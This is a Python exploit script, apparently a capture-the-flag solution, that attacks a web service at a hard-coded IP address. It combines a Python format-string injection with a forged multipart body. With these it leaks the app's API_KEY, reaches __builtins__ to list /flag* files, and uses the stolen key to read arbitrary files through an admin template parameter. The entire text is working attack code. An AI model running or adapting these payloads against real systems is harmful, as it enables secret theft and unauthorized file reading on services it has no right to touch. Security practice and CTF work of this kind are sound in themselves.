import httpx

TARGET = "http://223.6.249.127:36894"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def list_directory(api_key, path):
    # Use glob to find flag files - shorter payload
    fmt_payload = "{0.view_functions[action].__globals__[__builtins__].__import__(\"glob\").glob(\"/flag*\")}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=10.0)
    return r.text

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # List root directory
    print("\n[*] Listing / directory...")
    result = list_directory(api_key, "/")
    print(result)
    
    # Find flag file
    import re
    files = re.findall(r"flag-[a-f0-9]{32}\.txt", result)
    if files:
        for f in files:
            print(f"\n[!] Found flag file: {f}")
            flag_path = "/" + f
            content = read_file_via_admin(api_key, flag_path)
            print(f"[FLAG] {content}")
